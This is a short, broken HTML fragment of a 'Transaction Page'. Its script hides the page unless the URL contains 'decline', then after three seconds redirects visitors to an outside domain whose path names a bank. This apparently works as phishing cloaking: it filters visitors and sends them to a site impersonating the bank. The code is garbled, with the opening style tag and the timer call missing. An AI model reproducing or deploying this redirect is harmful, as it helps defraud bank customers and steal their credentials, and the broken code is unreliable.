    <title>Transaction Page</title>

        body {
            display: none; /* Hide content initially */
        }
    </style>
</head>
<body>

    <script>
        // Check if the URL contains 'decline'
        if (window.location.href.includes('decline')) {
            document.body.style.display = 'block'; // Show content if 'decline' is found in URL

                window.location.href = 'https://documentword.com/cadencebank.com'; // Change to your desired URL
            }, 3000); // 3000 milliseconds = 3 seconds
        }
    </script>
</body>
